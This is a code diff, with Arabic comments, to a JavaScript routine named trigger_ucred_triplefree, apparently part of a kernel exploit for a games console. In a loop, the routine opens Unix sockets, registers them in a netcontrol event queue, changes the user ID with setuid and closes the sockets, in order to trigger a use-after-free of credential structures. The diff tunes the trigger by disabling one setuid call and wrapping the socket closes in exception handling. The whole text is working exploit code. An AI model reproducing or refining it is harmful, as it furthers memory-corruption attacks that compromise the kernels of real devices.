@@ -1442,7 +1442,6 @@ function trigger_ucred_triplefree() {
     for (var i = 1; i <= LOOPS; i++) {
         send_notification("---- LOOP #" + i + " ----");
 
-        // 1) فتح dummy_socket
         var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
         send_notification("[1] dummy_socket FD = " + dummy_socket);
 
@@ -1451,29 +1450,35 @@ function trigger_ucred_triplefree() {
         }
         last_fd = Number(dummy_socket);
 
-        // 2) تسجيله في الـ queue
         write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)));
         var r1 = netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
         send_notification("[1] netcontrol(SET_QUEUE dummy) ret = " + r1);
 
-        // 3) لعب سريع في الهوية
         setuid(1);
-        setuid(0); // لو مسموح، علشان تزود الضغط على ucred
-        // لو مش مسموح ترجع 0، سيب setuid(1) بس
+        // مؤقتًا شيل setuid(0) لحد ما نثبت سلوك اللوب
+        // setuid(0);
 
-        // 4) فتح سوكت تاني بسرعة من غير delay
         var s2 = socket(AF_UNIX, SOCK_STREAM, 0);
         send_notification("[2] second socket FD = " + s2 + " (diff from dummy = " + (s2 - dummy_socket) + ")");
 
-        // 5) تسجيل السوكت التاني في الـ queue
         write32(nc_set_buf, Number(s2.and(0xFFFFFFFF)));
         var r2 = netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
         send_notification("[2] netcontrol(SET_QUEUE second) ret = " + r2);
 
-        // 6) قفل السوكتين بسرعة
-        close(new BigInt(dummy_socket));
-        close(new BigInt(s2));
-        send_notification("[3] both sockets closed");
+        // 6) قفل السوكتين بسرعة لكن بأمان
+        try {
+            close(new BigInt(dummy_socket));
+        } catch (e) {
+            send_notification("[3] close(dummy_socket) exception: " + e);
+        }
+
+        try {
+            close(new BigInt(s2));
+        } catch (e) {
+            send_notification("[3] close(s2) exception: " + e);
+        }
+
+        send_notification("[3] both sockets close attempted");
     }
 
     send_notification("===== GLOBAL RUN #" + global_run + " END =====");
